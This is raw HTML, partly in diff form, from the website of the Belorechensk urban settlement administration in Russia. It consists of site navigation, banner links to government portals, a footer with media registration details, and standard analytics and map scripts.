href="/sotsialnaya-sfera/antikorruptsionnaya-deyatelnost/obratnaya-svyaz-dlya-soobshchenij-o-faktakh-korruptsii" >Обратная связь для сообщений о фактах коррупции</a></li><li class="item-454"><a href="/sotsialnaya-sfera/antikorruptsionnaya-deyatelnost/metodicheskie-materialy" >Методические материалы</a></li></ul></li><li class="item-226 deeper parent"><a href="/sotsialnaya-sfera/blagoustrojstvo" >Формирование комфортной городской среды</a><ul class="nav-child unstyled small"><li class="item-333"><a href="/sotsialnaya-sfera/blagoustrojstvo/konkurs-malye-goroda" >Конкурс &quot;Малые города&quot;</a></li><li class="item-371"><a href="/sotsialnaya-sfera/blagoustrojstvo/2022" >Онлайн - голосование ФКГС </a></li><li class="item-445"><a href="/sotsialnaya-sfera/blagoustrojstvo/internet-golosovanie-2023" >Интернет-голосование 2023</a></li></ul></li><li class="item-231 deeper parent"><a href="/sotsialnaya-sfera/transportnaya-infrastruktura" >Транспортная инфраструктура</a><ul class="nav-child unstyled small"><li class="item-343"><a href="/sotsialnaya-sfera/transportnaya-infrastruktura/passazhirskie-perevozki" >Пассажирские перевозки</a></li><li class="item-344"><a href="/sotsialnaya-sfera/transportnaya-infrastruktura/dorozhnaya-deyatelnost" >Дорожная деятельность</a></li></ul></li><li class="item-236"><a href="/sotsialnaya-sfera/sotsialnaya-infrastruktura" >Социальная инфраструктура</a></li><li class="item-282"><a href="/sotsialnaya-sfera/munitsipalnoe-imushchestvo" >Муниципальное имущество</a></li><li class="item-302"><a href="/sotsialnaya-sfera/snitarnaya-formovochnaya-obrezka-zelenykh-nasazhdenij" >Санитарная(формовочная) обрезка зеленых насаждений</a></li><li class="item-331"><a href="/sotsialnaya-sfera/sozdanie-mest-nakopleniya-tverdykh-bytovykh-otkhodov-i-vedeniya-reestra" >Создание мест накопления твердых бытовых отходов и ведения реестра</a></li><li class="item-336"><a href="/sotsialnaya-sfera/pravila-blagoustrojstva-belorechenskogo-gorodskogo-poseleniya" >Правила благоустройства Белореченского городского поселения</a></li><li class="item-458"><a href="/sotsialnaya-sfera/initsiativnoe-byudzhetirovanie" >Инициативное бюджетирование</a></li></ul></li><li class="item-112 deeper parent"><a href="/sovet" >Совет</a><ul class="nav-child unstyled small"><li class="item-213"><a href="/sovet/predsedatel-soveta" >Председатель совета</a></li><li class="item-188"><a href="/sovet/spisok-deputatov" >Список депутатов</a></li><li class="item-189"><a href="/sovet/grafik-priema" >График приема</a></li><li class="item-214 deeper parent"><a href="/sovet/dokumenty" >Документы</a><ul class="nav-child unstyled small"><li class="item-190"><a href="/sovet/dokumenty/pravotvorchestvo-obnarodovanie" >Решения</a></li><li class="item-191"><a href="/sovet/dokumenty/proekty-reshenij" >Проекты решений</a></li><li class="item-215"><a href="/sovet/dokumenty/svedeniya-o-dokhodakh" >Сведения о доходах</a></li></ul></li></ul></li><li class="item-323 deeper parent"><a href="/arkhitektura-i-gradostroitel-stvo" >Архитектура и градостроительство</a><ul class="nav-child unstyled small"><li class="item-325 deeper parent"><a href="/arkhitektura-i-gradostroitel-stvo/pravila-zemlepolzovaniya-i-zastrojki" >Правила землепользования и застройки</a><ul class="nav-child unstyled small"><li class="item-328"><a href="/arkhitektura-i-gradostroitel-stvo/pravila-zemlepolzovaniya-i-zastrojki/uslovno-razreshennyj-vid-ispol-zovaniya-zemel-nogo-uchastka-i-obekta" >Условно разрешенный вид использования земельного участка и обекта</a></li><li class="item-329"><a href="/arkhitektura-i-gradostroitel-stvo/pravila-zemlepolzovaniya-i-zastrojki/otklaneniya-ot-predel-nykh-parametrov-razreshennogo-stroitel-stva-rekonstruktsiya" >Отклонения от предельных параметров разрешенного строительства (реконструкция)</a></li><li class="item-330"><a href="/arkhitektura-i-gradostroitel-stvo/pravila-zemlepolzovaniya-i-zastrojki/pravila-zemlepol-zovaniya-i-zastrojki-bgp" >Правила землепользования и застройки БГП</a></li></ul></li><li class="item-243 deeper parent"><a href="/arkhitektura-i-gradostroitel-stvo/gradostroitelnaya-deyatelnost" >Градостроительная деятельность</a><ul class="nav-child unstyled small"><li class="item-306"><a href="/arkhitektura-i-gradostroitel-stvo/gradostroitelnaya-deyatelnost/novosti-v-sfere-gradostroitel-stva" >Новости в сфере градостроительства</a></li><li class="item-307 deeper parent"><a href="/arkhitektura-i-gradostroitel-stvo/gradostroitelnaya-deyatelnost/dokumentatsiya-po-planirovke-territorij" >Документация по планировке территорий</a><ul class="nav-child unstyled small"><li class="item-308"><a href="/arkhitektura-i-gradostroitel-stvo/gradostroitelnaya-deyatelnost/dokumentatsiya-po-planirovke-territorij/proekty-mezhevaniya" >Проекты межевания</a></li><li class="item-309"><a href="/arkhitektura-i-gradostroitel-stvo/gradostroitelnaya-deyatelnost/dokumentatsiya-po-planirovke-territorij/proekty-planirovki" >Проекты планировки</a></li></ul></li><li class="item-326 deeper parent"><a href="/arkhitektura-i-gradostroitel-stvo/gradostroitelnaya-deyatelnost/dokumenty-territorial-nogo-planirovaniya" >Документы территориального планирования</a><ul class="nav-child unstyled small"><li class="item-327 deeper parent"><a href="/arkhitektura-i-gradostroitel-stvo/gradostroitelnaya-deyatelnost/dokumenty-territorial-nogo-planirovaniya/general-nyj-plan" >Генеральный план</a><ul class="nav-child unstyled small"><li class="item-347"><a href="/arkhitektura-i-gradostroitel-stvo/gradostroitelnaya-deyatelnost/dokumenty-territorial-nogo-planirovaniya/general-nyj-plan/materialy-po-obosnovaniyu" >Материалы по обоснованию</a></li><li class="item-348"><a href="/arkhitektura-i-gradostroitel-stvo/gradostroitelnaya-deyatelnost/dokumenty-territorial-nogo-planirovaniya/general-nyj-plan/polozheniya-utverzhdaemaya-chast" >Положения (утверждаемая часть)</a></li><li class="item-351"><a href="/arkhitektura-i-gradostroitel-stvo/gradostroitelnaya-deyatelnost/dokumenty-territorial-nogo-planirovaniya/general-nyj-plan/dokumenty" >Документы</a></li></ul></li></ul></li></ul></li><li class="item-429"><a href="/arkhitektura-i-gradostroitel-stvo/rosreestr" >Росреестр</a></li><li class="item-451"><a href="/arkhitektura-i-gradostroitel-stvo/normativy-gradostroitelnogo-proektirovaniya" >Нормативы градостроительного проектирования</a></li></ul></li><li class="item-259 deeper parent"><a href="/munitsipalnyj-kontrol" >Муниципальный контроль</a><ul class="nav-child unstyled small"><li class="item-260 deeper parent"><a href="/munitsipalnyj-kontrol/munitsipalnyj-zhilishchnyj-kontrol" >Муниципальный жилищный контроль</a><ul class="nav-child unstyled small"><li class="item-261"><a href="/munitsipalnyj-kontrol/munitsipalnyj-zhilishchnyj-kontrol/profilaktika-narushenij-obyazatelnykh-trebovanij" >Профилактика нарушений обязательных требований</a></li></ul></li><li class="item-288"><a href="/munitsipalnyj-kontrol/vnutrennij-finansovyj-kontrol" >Внутренний финансовый контроль</a></li><li class="item-363"><a href="/munitsipalnyj-kontrol/munitsipalnyj-zemelnyj-kontrol" >Муниципальный земельный контроль</a></li><li class="item-463"><a href="/munitsipalnyj-kontrol/munitsipalnyj-kontrol-v-sfere-blagoustrojstva" >Муниципальный контроль в сфере благоустройства</a></li></ul></li><li class="item-293"><a href="/nezavisimaya-antikorruptsionnaya-ekspertiza" >Независимая антикоррупционная экспертиза</a></li><li class="item-311 deeper parent"><a href="/podderzhka-malogo-i-srednego-predprinimatel-stva" >Поддержка малого и среднего предпринимательства</a><ul class="nav-child unstyled small"><li class="item-312 deeper parent"><a href="/podderzhka-malogo-i-srednego-predprinimatel-stva/obshchaya-informatsiya" >Общая информация</a><ul class="nav-child unstyled small"><li class="item-313"><a href="/podderzhka-malogo-i-srednego-predprinimatel-stva/obshchaya-informatsiya/usloviya-otneseniya-k-subektam-malogo-i-srednego-predprinimatel-stva" >Условия отнесения к субъектам малого и среднего предпринимательства</a></li><li class="item-314"><a href="/podderzhka-malogo-i-srednego-predprinimatel-stva/obshchaya-informatsiya/edinyj-reestr-subektov-malogo-i-srednego-predprinimatel-stva" >Единый реестр субъектов малого и среднего предпринимательства</a></li></ul></li><li class="item-315 deeper parent"><a href="/podderzhka-malogo-i-srednego-predprinimatel-stva/informatsionnaya-podderzhka-subektov-msp" >Информационная поддержка субъектов МСП</a><ul class="nav-child unstyled small"><li class="item-316 deeper parent"><a href="/podderzhka-malogo-i-srednego-predprinimatel-stva/informatsionnaya-podderzhka-subektov-msp/informatsiya-o-realizatsii-programm-podderzhki" >Информация о реализации программ поддержки</a><ul class="nav-child unstyled small"><li class="item-317"><a href="/podderzhka-malogo-i-srednego-predprinimatel-stva/informatsionnaya-podderzhka-subektov-msp/informatsiya-o-realizatsii-programm-podderzhki/vedomstvennaya-tselevaya-programma-g-belorechensk" >Ведомственная целевая программа г. Белореченск</a></li><li class="item-321"><a href="/podderzhka-malogo-i-srednego-predprinimatel-stva/informatsionnaya-podderzhka-subektov-msp/informatsiya-o-realizatsii-programm-podderzhki/itogi-realizatsii-tselevoj-kraevoj-programmy" >Итоги реализации целевой краевой программы </a></li><li class="item-322"><a href="/podderzhka-malogo-i-srednego-predprinimatel-stva/informatsionnaya-podderzhka-subektov-msp/informatsiya-o-realizatsii-programm-podderzhki/obyavlennye-kontursy-na-okazanie-finansovoj-podderzhki-subektam-msp" >Объявленные конкурсы на оказание финансовой поддержки субъектам МСП</a></li></ul></li><li class="item-456"><a href="/podderzhka-malogo-i-srednego-predprinimatel-stva/informatsionnaya-podderzhka-subektov-msp/dlya-svedeniya" >Для сведения</a></li></ul></li><li class="item-318"><a href="/podderzhka-malogo-i-srednego-predprinimatel-stva/imushchestvennaya-podderzhka-subektov-msp" >Имущественная поддержка субъектов МСП</a></li><li class="item-319"><a href="/podderzhka-malogo-i-srednego-predprinimatel-stva/konsul-tatsionnaya-podderzhka" >Консультационная поддержка</a></li><li class="item-320"><a href="/podderzhka-malogo-i-srednego-predprinimatel-stva/informatsiya-ob-organizatsiyakh-obrazuyushchikh-infrastrukturu-podderzhki-subektov-malogo-i-srednego-predprinimatel-stva" >Информация об организациях, образующих инфраструктуру поддержки субъектов малого и среднего предпринимательства</a></li><li class="item-346"><a href="/podderzhka-malogo-i-srednego-predprinimatel-stva/novosti-pred" >Новости</a></li><li class="item-360"><a href="/podderzhka-malogo-i-srednego-predprinimatel-stva/finansovoe-prosveshchenie" >Финансовое просвещение</a></li></ul></li><li class="item-362 deeper parent"><a href="/munitsipalnye-uslugi" >Муниципальные услуги</a><ul class="nav-child unstyled small"><li class="item-263"><a href="/munitsipalnye-uslugi/administrativnyj-reglament" >Административный регламент</a></li></ul></li><li class="item-455"><a href="/sledstvennyj-otdel-po-belorechenskomu-rajonu-su-sk-rf-po-krasnodarskomu-krayu" >Следственный отдел по Белореченскому району СУ СК РФ по Краснодарскому краю</a></li><li class="item-461"><a href="/mku-upravlenie-go-i-chs-pb-i-ss-bgp" >МКУ «Управление ГО и ЧС, ПБ и СС БГП»</a></li><li class="item-483"><a href="/ob-uvekovechenii-pamyati-pogibshikh-pri-zashchite-otechestva" >&quot;Об увековечении памяти погибших при защите Отечества&quot;</a></li></ul>
+		</div>
+			<div class="moduletable">
+						
+
+<div class="custom"  >
+	<p><a href="https://np.krasnodar.ru/"><img src="/images/banners/np.jpg" alt="np" width="200" height="200" style="display: block; margin: 5px auto; border: 1px solid #ababab;" /></a></p></div>
+		</div>
+			<div class="moduletable">
+						
+
+<div class="custom"  >
+	<p><a href="/sotsialnaya-sfera/blagoustrojstvo"><img src="/images/banners/gor_sreda.jpg" alt="Формирование комфортной городской среды" width="200" height="122" style="display: block; margin: 5px auto; border: 1px solid rgb(171, 171, 171);" /></a></p></div>
+		</div>
+			<div class="moduletable">
+						
+
+<div class="custom"  >
+	<p><a href="/60-gosuslugi"><img src="/images/banners/gosuslugi.jpg" alt="gosuslugi" style="display: block; margin: 5px auto; border: 1px solid #ababab;" /></a></p></div>
+		</div>
+	
+                        </aside>
+                    </div>
+                    
+                </div>
+            </div>
+            <div id="baners">
+                <!-- Яндекс карта-->
+                <div class="row">
+                    <div class="col">
+                        <script type="text/javascript" charset="utf-8" async src="https://api-maps.yandex.ru/services/constructor/1.0/js/?um=constructor%3Ac948c43179e6afdd6a3fcbf7a2a5398da9329de7d770872d249046d0afd4d31b&amp;width=100%25&amp;height=400&amp;lang=ru_RU&amp;scroll=true"></script>
+                    </div>
+                </div>
+                <div class="row">
+                    <div class="col">
+                        		<div class="moduletable">
+						<div class="bannergroup">
+
+	<div class="banneritem">
+																																																																			<a
+							href="/component/banners/click/6" target="_blank" rel="noopener noreferrer"
+							title="Сайт президента">
+							<img
+								src="https://www.gorodbelorechensk.ru/images/banners/prezident.jpg"
+								alt="Официальный сайт Президента РФ"
+																							/>
+						</a>
+																<div class="clr"></div>
+	</div>
+	<div class="banneritem">
+																																																																			<a
+							href="/component/banners/click/7" target="_blank" rel="noopener noreferrer"
+							title="Сайт правительства">
+							<img
+								src="https://www.gorodbelorechensk.ru/images/banners/pravitelstvo.jpg"
+								alt="Официальный сайт Правительства РФ"
+																							/>
+						</a>
+																<div class="clr"></div>
+	</div>
+	<div class="banneritem">
+																																																																			<a
+							href="/component/banners/click/8" target="_blank" rel="noopener noreferrer"
+							title="Сайт Совета Федерации">
+							<img
+								src="https://www.gorodbelorechensk.ru/images/banners/sovfed.jpg"
+								alt="Официальный сайт Совета Федерации"
+																							/>
+						</a>
+																<div class="clr"></div>
+	</div>
+	<div class="banneritem">
+																																																																			<a
+							href="/component/banners/click/9" target="_blank" rel="noopener noreferrer"
+							title="Сайта Государственной Думы">
+							<img
+								src="https://www.gorodbelorechensk.ru/images/banners/gosduma.jpg"
+								alt="Официальный сайт Государственно Думы РФ"
+																							/>
+						</a>
+																<div class="clr"></div>
+	</div>
+	<div class="banneritem">
+																																																																			<a
+							href="/component/banners/click/20" target="_blank" rel="noopener noreferrer"
+							title="Официальный сайта администрации Краснодарского края">
+							<img
+								src="https://www.gorodbelorechensk.ru/images/banners/krasnodarskiyKR.jpg"
+								alt="Официальный сайта администрации Краснодарского края"
+																							/>
+						</a>
+																<div class="clr"></div>
+	</div>
+	<div class="banneritem">
+																																																																			<a
+							href="/component/banners/click/1" target="_blank" rel="noopener noreferrer"
+							title="Сайт белореченского района">
+							<img
+								src="https://www.gorodbelorechensk.ru/images/banners/banner3.jpg"
+								alt="Сайт белореченского района"
+								 width="200"								 height="80"							/>
+						</a>
+																<div class="clr"></div>
+	</div>
+	<div class="banneritem">
+																																																																			<a
+							href="/component/banners/click/19" target="_blank" rel="noopener noreferrer"
+							title="ФНС">
+							<img
+								src="https://www.gorodbelorechensk.ru/images/banners/nalog.jpg"
+								alt="Заплати налоги!"
+																							/>
+						</a>
+																<div class="clr"></div>
+	</div>
+	<div class="banneritem">
+																																																																			<a
+							href="/component/banners/click/10" target="_blank" rel="noopener noreferrer"
+							title="Геоинформационная система">
+							<img
+								src="https://www.gorodbelorechensk.ru/images/banners/geoinf.jpg"
+								alt="Геоинформационная система Краснодарского края"
+																							/>
+						</a>
+																<div class="clr"></div>
+	</div>
+	<div class="banneritem">
+																																																																			<a
+							href="/component/banners/click/11" target="_blank" rel="noopener noreferrer"
+							title="Жилье для Российскийх семей">
+							<img
+								src="https://www.gorodbelorechensk.ru/images/banners/gilie.jpg"
+								alt="Жилье для Российскийх семей"
+																							/>
+						</a>
+																<div class="clr"></div>
+	</div>
+	<div class="banneritem">
+																																																																			<a
+							href="/component/banners/click/12" target="_blank" rel="noopener noreferrer"
+							title="Каремонт">
+							<img
+								src="https://www.gorodbelorechensk.ru/images/banners/kapremont-.jpg"
+								alt="НКО Фонд капитального ремонта многоквартирных домов"
+								 width="200"								 height="80"							/>
+						</a>
+																<div class="clr"></div>
+	</div>
+	<div class="banneritem">
+																																																																			<a
+							href="/component/banners/click/13" target="_blank" rel="noopener noreferrer"
+							title="Ты предприниматель">
+							<img
+								src="https://www.gorodbelorechensk.ru/images/banners/cajdr1dy.gif"
+								alt="Ты предприниматель"
+																							/>
+						</a>
+																<div class="clr"></div>
+	</div>
+	<div class="banneritem">
+																																																																			<a
+							href="/component/banners/click/14" target="_blank" rel="noopener noreferrer"
+							title="Горячая линия по вопросам улучшения инвестиционного климата">
+							<img
+								src="https://www.gorodbelorechensk.ru/images/banners/gorline.gif"
+								alt="Горячая линия по вопросам улучшения инвестиционного климата"
+																							/>
+						</a>
+																<div class="clr"></div>
+	</div>
+	<div class="banneritem">
+																																																																			<a
+							href="/component/banners/click/15" target="_blank" rel="noopener noreferrer"
+							title="Справочно информационный портал государственных услуг">
+							<img
+								src="https://www.gorodbelorechensk.ru/images/banners/pgu.gif"
+								alt="Справочно информационный портал государственных услуг"
+																							/>
+						</a>
+																<div class="clr"></div>
+	</div>
+	<div class="banneritem">
+																																																																			<a
+							href="/component/banners/click/16" target="_blank" rel="noopener noreferrer"
+							title="Портал органов власти Краснодарского края">
+							<img
+								src="https://www.gorodbelorechensk.ru/images/banners/orgvlkk.jpg"
+								alt="Портал органов власти Краснодарского края"
+																							/>
+						</a>
+																<div class="clr"></div>
+	</div>
+	<div class="banneritem">
+																																																																			<a
+							href="/component/banners/click/17" target="_blank" rel="noopener noreferrer"
+							title="Официальный сайт Российской Федерации по размещению заказов">
+							<img
+								src="https://www.gorodbelorechensk.ru/images/banners/zakupki_gov.gif"
+								alt="Официальный сайт Российской Федерации по размещению заказов"
+																							/>
+						</a>
+																<div class="clr"></div>
+	</div>
+	<div class="banneritem">
+																																																																			<a
+							href="/component/banners/click/18" target="_blank" rel="noopener noreferrer"
+							title="Государственная система правовой информации">
+							<img
+								src="https://www.gorodbelorechensk.ru/images/banners/gspi.jpg"
+								alt="Государственная система правовой информации"
+																							/>
+						</a>
+																<div class="clr"></div>
+	</div>
+	<div class="banneritem">
+																																																																			<a
+							href="/component/banners/click/22" target="_blank" rel="noopener noreferrer"
+							title="Карта убитых дорог">
+							<img
+								src="https://www.gorodbelorechensk.ru/images/banners/1.jpg"
+								alt="Карта убитых дорог"
+								 width="200"								 height="80"							/>
+						</a>
+																<div class="clr"></div>
+	</div>
+	<div class="banneritem">
+																																																																			<a
+							href="/component/banners/click/23" target="_blank" rel="noopener noreferrer"
+							title="Горячая линия по вопросам ТКО">
+							<img
+								src="https://www.gorodbelorechensk.ru/images/banners/tko.jpg"
+								alt="Горячая линия по вопросам ТКО"
+																							/>
+						</a>
+																<div class="clr"></div>
+	</div>
+
+</div>
+		</div>
+	
+                    </div>
+                </div>
+            </div>
+        </div>   
+            <footer>
+                <div class="row">
+                	<div class="col fooretInfo">		<div class="moduletable">
+						
+
+<div class="custom"  >
+	<p>2026 © Администрация Белореченского городского поселения Белореченского района.<br />Свидетельство о регистрации СМИ ЭЛ № ФС 77 - 78914 выдано Федеральной службой по надзору в сфере связи, информационных технологий и массовых коммуникаций (Роскомнадзор) 07.08.2020 г.<br />Наименование сетевого издания «GORODBELORECHENSK.RU».<br />Учредитель: Администрация Белореченского городского поселения Белореченского района.<br />Главный редактор: С.И.Рвачев<br />Адрес электронной почты и номер телефона главного редактора сетевого издания:<br /><a href="mailto:priemnaya@gorodbelorechensk.,ru">priemnaya@gorodbelorechensk.ru</a>,&nbsp;<a href="tel:+78612596771">+7 (861) 553-20-18</a>.<br />0+</p></div>
+		</div>
+	</div> 
+                <div class="row">
+                    
+                    <div class="col"></div>
+                    <div class="col"></div>
+                    <div class="col"></div>
+                    <div class="col">		<div class="moduletable">
+						<a href="/?format=feed&amp;type=rss" class="syndicate-module">
+	<img src="/media/system/images/livemarks.png" alt="feed-image" />	</a>
+		</div>
+	
+<!-- Yandex.Metrika informer -->
+                        <a href="https://metrika.yandex.ru/stat/?id=44860429&amp;from=informer"
+                        target="_blank" rel="nofollow"><img src="https://informer.yandex.ru/informer/44860429/3_1_FFFFFFFF_EFEFEFFF_0_pageviews"
+                        style="width:88px; height:31px; border:0;" alt="Яндекс.Метрика" title="Яндекс.Метрика: данные за сегодня (просмотры, визиты и уникальные посетители)" class="ym-advanced-informer" data-cid="44860429" data-lang="ru" /></a>
+<!-- /Yandex.Metrika informer -->
+                    </div>
+                </div>
+            </footer>
+    </div>
+
+<!-- Скрипты -->
+    <!-- Обновить браузер! -->                  
+<script> 
+var $buoop = {required:{e:0,f:-3,o:-3,s:-1,c:-3},insecure:true,api:2020.02 }; 
+function $buo_f(){ 
+ var e = document.createElement("script"); 
+ e.src = "//browser-update.org/update.min.js"; 
+ document.body.appendChild(e);
+};
+try {document.addEventListener("DOMContentLoaded", $buo_f,false)}
+catch(e){window.attachEvent("onload", $buo_f)}
+</script>
+                      
+                      
+                      
+<!-- Sputnik --> 
+ <script type="text/javascript">
+       (function(d, t, p) {
+           var j = d.createElement(t); j.async = true; j.type = "text/javascript";
+           j.src = ("https:" == p ? "https:" : "http:") + "//stat.sputnik.ru/cnt.js";
+           var s = d.getElementsByTagName(t)[0]; s.parentNode.insertBefore(j, s);
+       })(document, "script", document.location.protocol);
+    </script>
+<!-- Yandex.Metrika counter -->
+        <script type="text/javascript">
+            (function (d, w, c) {
+                (w[c] = w[c] || []).push(function() {
+                    try {
+                        w.yaCounter44860429 = new Ya.Metrika({
+                            id:44860429,
+                            clickmap:true,
+                            trackLinks:true,
+                            accurateTrackBounce:true
+                        });
+                    } catch(e) { }
+                });
+
+                var n = d.getElementsByTagName("script")[0],
+                    s = d.createElement("script"),
+                    f = function () { n.parentNode.insertBefore(s, n); };
+                s.type = "text/javascript";
+                s.async = true;
+                s.src = "https://mc.yandex.ru/metrika/watch.js";
+
+                if (w.opera == "[object Opera]") {
+                    d.addEventListener("DOMContentLoaded", f, false);
+                } else { f(); }
+            })(document, window, "yandex_metrika_callbacks");
+        </script>
+        <noscript><div><img src="https://mc.yandex.ru/watch/44860429" style="position:absolute; left:-9999px;" alt="" /></div></noscript>
+<!-- /Yandex.Metrika counter -->
+      
+            </div>
+          </div>
+  </div>
+
+</body>
+</html> 
